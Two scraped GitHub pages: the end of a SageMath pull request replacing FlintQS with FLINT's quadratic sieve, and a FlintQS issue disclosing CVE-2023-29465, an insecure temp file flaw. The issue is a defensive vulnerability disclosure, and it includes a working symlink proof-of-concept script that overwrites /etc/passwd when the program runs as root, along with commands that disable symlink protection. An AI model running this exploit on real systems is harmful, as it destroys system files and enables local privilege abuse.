| --- | --- | --- |
|  |  | if factors.sign < 0: |
|  |  | # FLINT doesn't return the plus/minus one factor. |
|  |  | pairs.append( (Integer(-1), int(1)) ) |

Copy link

Contributor

### @videlec **[videlec](/videlec)** [Apr 2, 2023](#discussion_r1155320367)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

No space around `(` (for the linter to be happy)

Sorry, something went wrong.

All reactions

Copy link

Contributor

Author

### @orlitzky **[orlitzky](/orlitzky)** [Apr 3, 2023](#discussion_r1155935563)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Done.

Sorry, something went wrong.

All reactions

[src/sage/libs/flint/qsieve.pyx](/sagemath/sage/pull/35419/files/cfe19b457a5730d5d4e69e4671d3132352578630#diff-26150da2f912d1f3a852133f73e3b62c87dd4ea58023ea711e7986c304e0aee2)
Outdated

|  |  |  |
| --- | --- | --- |
|  |  | n = Integer(n) |
|  |  |  |
|  |  | sig\_on() |

Copy link

Contributor

### @videlec **[videlec](/videlec)** [Apr 2, 2023](#discussion_r1155321080)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

I would not put declarations such as `cdef fmpz_t p` inside `sig_on()`/`sig_off()`. It makes it harder to parse what is between these. More dramatically, I think that the presence of a cast operation `<Integer> n` between `sig_on()`/`sig_off()` is a source of segmentation fault (as it could raise a `TypeError`). The latter would be solved by properly typing the function signature.

Sorry, something went wrong.

All reactions

Copy link

Contributor

Author

### @orlitzky **[orlitzky](/orlitzky)** [Apr 3, 2023](#discussion_r1155936533)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Ok, I've moved them down to surround only the long-running factorization functions. I've also added `Integer n` to the signature of `factor_using_flint`.

Sorry, something went wrong.

All reactions

 [orlitzky](/orlitzky)
added 2 commits
[April 2, 2023 12:19](#commits-pushed-73a0aa3)

[![@orlitzky](https://avatars.githubusercontent.com/u/1432135?s=40&v=4)](/orlitzky)

`[src/sage/rings/factorint.pyx: fix pycodestyle warnings.](/sagemath/sage/pull/35419/commits/73a0aa3cedbf03f713ebb0300bada211971ef201 "src/sage/rings/factorint.pyx: fix pycodestyle warnings.")`

`[73a0aa3](/sagemath/sage/pull/35419/commits/73a0aa3cedbf03f713ebb0300bada211971ef201)`

[![@orlitzky](https://avatars.githubusercontent.com/u/1432135?s=40&v=4)](/orlitzky)

`[src/sage/libs/flint/qsieve.pyx: fix pycodestyle warnings.](/sagemath/sage/pull/35419/commits/810817bc39e73a56df435ad1609c55ef865a438b "src/sage/libs/flint/qsieve.pyx: fix pycodestyle warnings.")`

`[810817b](/sagemath/sage/pull/35419/commits/810817bc39e73a56df435ad1609c55ef865a438b)`

[![@videlec](https://avatars.githubusercontent.com/u/5619446?s=40&v=4)](/videlec)
[videlec](/videlec)
added
[c: interfaces](/sagemath/sage/labels/c%3A%20interfaces)
[s: needs work](/sagemath/sage/labels/s%3A%20needs%20work)
labels
[Apr 2, 2023](#event-8906784014)

 [orlitzky](/orlitzky)
added 5 commits
[April 2, 2023 19:58](#commits-pushed-378aa65)

[![@orlitzky](https://avatars.githubusercontent.com/u/1432135?s=40&v=4)](/orlitzky)

`[src/sage/libs/flint/qsieve.pyx: zero shouldn't have a factorization.](/sagemath/sage/pull/35419/commits/378aa6531271343c712a4e039c812919d91390ae "src/sage/libs/flint/qsieve.pyx: zero shouldn't have a factorization.

To match the behavior of ZZ.zero().factor(), we make qsieve(0) raise
an ArithmeticError instead of returning 0^1.")`
 …

`[378aa65](/sagemath/sage/pull/35419/commits/378aa6531271343c712a4e039c812919d91390ae)`

```
To match the behavior of ZZ.zero().factor(), we make qsieve(0) raise
an ArithmeticError instead of returning 0^1.
```

[![@orlitzky](https://avatars.githubusercontent.com/u/1432135?s=40&v=4)](/orlitzky)

`[src/sage/rings/factorint.pyx: require Integer arg in factor_using_fli…](/sagemath/sage/pull/35419/commits/2da9dc084f101449e861dff6c1115dc2837c4644 "src/sage/rings/factorint.pyx: require Integer arg in factor_using_flint().

This is an internal function, so we might as well ensure that the
argument is the type that we expect it to be.")`
 …

`[2da9dc0](/sagemath/sage/pull/35419/commits/2da9dc084f101449e861dff6c1115dc2837c4644)`

```
…nt().

This is an internal function, so we might as well ensure that the
argument is the type that we expect it to be.
```

[![@orlitzky](https://avatars.githubusercontent.com/u/1432135?s=40&v=4)](/orlitzky)

`[Tighten sig_on/sig_off in FLINT factorization routines.](/sagemath/sage/pull/35419/commits/1e32c03154f5b4be262d3f01be4c09447e2e176e "Tighten sig_on/sig_off in FLINT factorization routines.

This makes it more obvious where the long computation takes place.")`
 …

`[1e32c03](/sagemath/sage/pull/35419/commits/1e32c03154f5b4be262d3f01be4c09447e2e176e)`

```
This makes it more obvious where the long computation takes place.
```

[![@orlitzky](https://avatars.githubusercontent.com/u/1432135?s=40&v=4)](/orlitzky)

`[Factor out the code for FLINT -> python factorization conversions.](/sagemath/sage/pull/35419/commits/5bbaf2fdddaac4913eaadea26986b46779c61204 "Factor out the code for FLINT -> python factorization conversions.

Both qsieve() and factor_using_flint() need to convert a fmpz_factor_t
to a list of (factor, exponent) pairs. Here we move that functionality
into a new C function, fmpz_factor_to_pairlist, under sage.libs.flint.")`
 …

`[5bbaf2f](/sagemath/sage/pull/35419/commits/5bbaf2fdddaac4913eaadea26986b46779c61204)`

```
Both qsieve() and factor_using_flint() need to convert a fmpz_factor_t
to a list of (factor, exponent) pairs. Here we move that functionality
into a new C function, fmpz_factor_to_pairlist, under sage.libs.flint.
```

[![@orlitzky](https://avatars.githubusercontent.com/u/1432135?s=40&v=4)](/orlitzky)

`[More pycodestyle tweaks in the new FLINT factorization modules.](/sagemath/sage/pull/35419/commits/7a70d48a3fae68cff50ee00c4e79791dceccea7c "More pycodestyle tweaks in the new FLINT factorization modules.")`

`[7a70d48](/sagemath/sage/pull/35419/commits/7a70d48a3fae68cff50ee00c4e79791dceccea7c)`

[![@orlitzky](https://avatars.githubusercontent.com/u/1432135?s=80&v=4)](/orlitzky)

Copy link

Contributor

Author

### **[orlitzky](/orlitzky)** commented [Apr 3, 2023](#issuecomment-1494313517)

| In response to your first comment:  Instead of writing twice the same code, why don't you write a function to convert the fmpz\_factor\_t to the proper sage Factorization object?  I've done this, but it only converts to a list of pairs. The `factor()` method then converts the list to a `Factorization`. This allows the behavior of `factor_using_flint` to mirror `factor_using_pari`, and doesn't change the output type of `qsieve` from a list to a `Factorization` (keeping in mind that `qsieve` is documented and in the global namespace).  I do not understand why one of the factorization function ends up in sage/rings/factorint.pyx while the other is in sage/libs/flint/qsieve.pyx  The default `n.factor()` is implemented using `factor_using_pari` from `sage.rings.factorint`, and for algorithm="flint", I simply copied that. The `qsieve` function already lived in its own separate module. I moved the module from interfaces to libs/flint, but otherwise didn't restructure.  I agree that it's messy, but the whole thing could probably use a refactoring to e.g. move `sage.rings.factorint` into the integer class. |
| --- |

All reactions

Sorry, something went wrong.

This was referenced Apr 6, 2023

[CVE-2023-29465: Unsafe TMPDIR usage
sagemath/FlintQS#3](/sagemath/FlintQS/issues/3)

Open

[Silence compiler warnings
sagemath/FlintQS#2](/sagemath/FlintQS/pull/2)
 Open

[![@orlitzky](https://avatars.githubusercontent.com/u/1432135?s=40&v=4)](/orlitzky)
[orlitzky](/orlitzky)
added
[s: needs review](/sagemath/sage/labels/s%3A%20needs%20review)
and removed
[s: needs work](/sagemath/sage/labels/s%3A%20needs%20work)
labels
[Apr 6, 2023](#event-8949778872)

[![@orlitzky](https://avatars.githubusercontent.com/u/1432135?s=40&v=4)](/orlitzky)

`[src/sage/libs/flint/fmpz_factor.pyx: simplify fmpz_factor_to_pairlist().](/sagemath/sage/pull/35419/commits/9549887c3ffa67f902a88b1dd966514530e754ea "src/sage/libs/flint/fmpz_factor.pyx: simplify fmpz_factor_to_pairlist().

There's no need for intermediate GMP integers in this function.")`
 …

`[9549887](/sagemath/sage/pull/35419/commits/9549887c3ffa67f902a88b1dd966514530e754ea)`

```
There's no need for intermediate GMP integers in this function.
```

[![@musicinmybrain](https://avatars.githubusercontent.com/u/6898909?s=80&u=9010312053e7141383b9bdf538036c7f37fbaba0&v=4)](/musicinmybrain)

Copy link

### **[musicinmybrain](/musicinmybrain)** commented [Apr 7, 2023](#issuecomment-1500459204) • edited Loading

| Thanks for doing this work. I am keeping an eye on this PR so I can consider orphaning or retiring the [`flintqs` CLI package](https://src.fedoraproject.org/rpms/flintqs) in Fedora Linux once the [packaged version of `sagemath`](https://src.fedoraproject.org/rpms/sagemath) no longer requires it. |
| --- |

All reactions

Sorry, something went wrong.

[![videlec](https://avatars.githubusercontent.com/u/5619446?s=60&v=4)](/videlec)

**[videlec](/videlec)**
reviewed
[Apr 12, 2023](#pullrequestreview-1380730203)

 [View reviewed changes](/sagemath/sage/pull/35419/files/9549887c3ffa67f902a88b1dd966514530e754ea)

[src/sage/tests/book\_stein\_ent.py](/sagemath/sage/pull/35419/files/9549887c3ffa67f902a88b1dd966514530e754ea#diff-2cb5ada4ae59906796897aab2d3d2f33644af4a8e0f701ff47d653ef5f1bbd2e)

|  |  | @@ -287,8 +287,7 @@ | |
| --- | --- | --- | --- |
|  |  | sage: q = next\_prime(randrange(2^97)) |
|  |  | sage: n = p \* q |
|  |  | sage: qsieve(n) # long time (8s on sage.math, 2011) |
|  |  | ([6340271405786663791648052309, |
|  |  | 46102313108592180286398757159], '') |
|  |  | [(6340271405786663791648052309, 1), (46102313108592180286398757159, 1)] |

Copy link

Contributor

### @videlec **[videlec](/videlec)** [Apr 12, 2023](#discussion_r1163757759)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

You will need to alert Bill about this change when the PR is merged.

Sorry, something went wrong.

All reactions

[![@videlec](https://avatars.githubusercontent.com/u/5619446?s=40&v=4)](/videlec)
[videlec](/videlec)
added
[s: positive review](/sagemath/sage/labels/s%3A%20positive%20review)
and removed
[s: needs review](/sagemath/sage/labels/s%3A%20needs%20review)
labels
[Apr 12, 2023](#event-8982456088)

[![videlec](https://avatars.githubusercontent.com/u/5619446?s=60&v=4)](/videlec)

**[videlec](/videlec)**
approved these changes
[Apr 12, 2023](#pullrequestreview-1380733985)

 [View reviewed changes](/sagemath/sage/pull/35419/files/9549887c3ffa67f902a88b1dd966514530e754ea)

[![@orlitzky](https://avatars.githubusercontent.com/u/1432135?s=40&v=4)](/orlitzky)
[orlitzky](/orlitzky)
mentioned this pull request
[Apr 12, 2023](#ref-issue-1664513929)

[Refactor factoring
#35488](/sagemath/sage/issues/35488)

Open

[![@vbraun](https://avatars.githubusercontent.com/u/888729?s=40&v=4)](/vbraun)
[vbraun](/vbraun)
merged commit [`820909d`](/sagemath/sage/commit/820909d7c55599836a881a8dd1ed385a4cc1b2a0)
into
sagemath:develop

[Apr 13, 2023](https://github.com/sagemath/sage/pull/35419#event-9001874552)

[![@mkoeppe](https://avatars.githubusercontent.com/u/8345221?s=40&u=1e9aee624fb4f608ab5e895966f9773fd9ab65b9&v=4)](/mkoeppe)
[mkoeppe](/mkoeppe)
added this to the [sage-10.0](/sagemath/sage/milestone/152) milestone
[Apr 14, 2023](#event-9002385729)

[![@mkoeppe](https://avatars.githubusercontent.com/u/8345221?s=40&u=1e9aee624fb4f608ab5e895966f9773fd9ab65b9&v=4)](/mkoeppe)
[mkoeppe](/mkoeppe)
removed
the
[s: positive review](/sagemath/sage/labels/s%3A%20positive%20review)
label
[Apr 14, 2023](#event-9002388288)

[collares](/collares)
pushed a commit
to NixOS/nixpkgs
that referenced
this pull request
[Mar 26, 2024](#ref-commit-c8d30c0)
[![@Feyorsh](https://avatars.githubusercontent.com/u/44840644?s=40&u=0a498d7bbd5d30da4694c929305b134a888d341f&v=4)](/Feyorsh)

`[sage: drop flintqs](/NixOS/nixpkgs/commit/c8d30c0af9f4b2be3918694b8a9132a235ae975c "sage: drop flintqs

FlintQS is no longer maintained and has several bugs.
As of https://github.com/sagemath/sage/pull/35419, all of FlintQS's
functionality is contained within Sage.")`
…

`[c8d30c0](/NixOS/nixpkgs/commit/c8d30c0af9f4b2be3918694b8a9132a235ae975c)`

```
FlintQS is no longer maintained and has several bugs.
As of [sagemath/sage#35419](https://github.com/sagemath/sage/pull/35419), all of FlintQS's
functionality is contained within Sage.
```

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fsagemath%2Fsage%2Fpull%2F35419)

Reviewers

[![@videlec](https://avatars.githubusercontent.com/u/5619446?s=40&v=4)](/videlec) [videlec](/videlec)

videlec approved these changes

Assignees

No one assigned

Labels

[c: interfaces](/sagemath/sage/labels/c%3A%20interfaces)

Projects

None yet

Milestone

 [**sage-10.0**](/sagemath/sage/milestone/152 "sage-10.0")

Development

Successfully merging this pull request may close these issues.

5 participants

[![@orlitzky](https://avatars.githubusercontent.com/u/1432135?s=52&v=4)](/orlitzky) [![@musicinmybrain](https://avatars.githubusercontent.com/u/6898909?s=52&v=4)](/musicinmybrain) [![@videlec](https://avatars.githubusercontent.com/u/5619446?s=52&v=4)](/videlec) [![@vbraun](https://avatars.githubusercontent.com/u/888729?s=52&v=4)](/vbraun) [![@mkoeppe](https://avatars.githubusercontent.com/u/8345221?s=52&v=4)](/mkoeppe)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_297991fa_20250114_181643.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsagemath%2FFlintQS%2Fissues%2F3)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsagemath%2FFlintQS%2Fissues%2F3)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=sagemath%2FFlintQS)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

This repository has been archived by the owner on Apr 7, 2023. It is now read-only.

[sagemath](/sagemath)
/
**[FlintQS](/sagemath/FlintQS)**
Public archive

* [Notifications](/login?return_to=%2Fsagemath%2FFlintQS) You must be signed in to change notification settings
* [Fork
  4](/login?return_to=%2Fsagemath%2FFlintQS)
* [Star
   8](/login?return_to=%2Fsagemath%2FFlintQS)

* [Code](/sagemath/FlintQS)
* [Issues
  1](/sagemath/FlintQS/issues)
* [Pull requests
  2](/sagemath/FlintQS/pulls)
* [Actions](/sagemath/FlintQS/actions)
* [Projects
  0](/sagemath/FlintQS/projects)
* [Security](/sagemath/FlintQS/security)
* [Insights](/sagemath/FlintQS/pulse)

Additional navigation options

* [Code](/sagemath/FlintQS)
* [Issues](/sagemath/FlintQS/issues)
* [Pull requests](/sagemath/FlintQS/pulls)
* [Actions](/sagemath/FlintQS/actions)
* [Projects](/sagemath/FlintQS/projects)
* [Security](/sagemath/FlintQS/security)
* [Insights](/sagemath/FlintQS/pulse)

# CVE-2023-29465: Unsafe TMPDIR usage #3

Open

[orlitzky](/orlitzky) opened this issue
Apr 6, 2023
· 0 comments

Open

# [CVE-2023-29465: Unsafe TMPDIR usage](#top) #3

[orlitzky](/orlitzky) opened this issue
Apr 6, 2023
· 0 comments

## Comments

[![@orlitzky](https://avatars.githubusercontent.com/u/1432135?s=80&v=4)](/orlitzky)

Copy link

Collaborator

### **[orlitzky](/orlitzky)** commented [Apr 6, 2023](#issue-1657896774)

| I've mentioned a vague `/tmp` vulnerability a few times, so here it is for posterity.  FlintQS uses temporary files in a few places, e.g. <https://github.com/sagemath/FlintQS/blob/master/src/lprels.cpp#L494>. If `TMPDIR` is set then FlintQS will respect it, but typically `TMPDIR` is set to a world-writable path like `/tmp` on UNIX. And in that case, the predictable filename chosen represents a security vulnerability. For example, in the line  ``` char * REL_name = get_filename(tmp_dir,unique_filename(REL_str)); ```  The `get_filename()` function simple concatenates its two arguments, a directory and a file, to make the path. Meanwhile `unique_filename()` concatenates the current UID and PID to the string you give it. Which is somewhat unique, but still predictable, since the UID and PID of a process are usually visible to other users on the machine. Since FlintQS uses a plain `fopen()` on these paths, it's vulnerable to [all of the usual `/tmp` exploits](https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File).  As a proof of concept, the following script is designed to overwrite `/etc/passwd` when FlintQS is run as root with `TMPDIR=/tmp`:  ``` # exploit.sh EXT=""  while [ -z "${EXT}" ]; do   EXT=$(ps -u 0 -C QuadraticSieve -o uid=,pid= | tr -s ' ' | tr ' ' .) done  PATHNAME="${TMPDIR}/rels${EXT}" ln -s /etc/passwd "${PATHNAME}" ```  Feel free to launch it,  ``` $ export TMPDIR=/tmp $ sh exploit.sh  ```  Now, as root, in another terminal... **BACK UP /etc/passwd**. If you have it enabled, you'll first have to disable the (non-default, linux-only) `fs.protected_symlinks` sysctl on Linux that stops us from doing the exact thing that we're doing. Then simply launch `QuadraticSieve`. Your `/etc/passwd` should be overwritten.  ``` # cp -a /etc/passwd /root # sysctl fs.protected_symlinks=0 # export TMPDIR=/tmp # echo 2239744742208359750202459571862470963447786169650421560804978144723333977920476664877327716487683639603 | QuadraticSieve  ```  Finally, turn this back on:  ``` # sysctl fs.protected_symlinks=1  ```  A proper fix for this would require `mkstemp()`. However, a quadratic sieve is now available in FLINT itself, as `qsieve_factor()`. Instead of modernizing FlintQS (which is basically an old fork of the FLINT routine), I have opened [sagemath/sage#35419](https://github.com/sagemath/sage/pull/35419) to replace FlintQS within SageMath. |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@orlitzky](https://avatars.githubusercontent.com/u/1432135?s=40&v=4)](/orlitzky)
[orlitzky](/orlitzky)
mentioned this issue
[Apr 6, 2023](#ref-pullrequest-970736466)

[Silence compiler warnings
#2](/sagemath/FlintQS/pull/2)
 Open

[![@orlitzky](https://avatars.githubusercontent.com/u/1432135?s=40&v=4)](/orlitzky)
[orlitzky](/orlitzky)
changed the title
~~Unsafe TMPDIR usage~~
CVE-2023-29465: Unsafe TMPDIR usage
[Apr 6, 2023](#event-8949626700)

[Sign up for free](/join?source=comment-repo)
**to subscribe to this conversation on GitHub**.
Already have an account?
[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsagemath%2FFlintQS%2Fissues%2F3).

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

1 participant

[![@orlitzky](https://avatars.githubusercontent.com/u/1432135?s=52&v=4)](/orlitzky)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


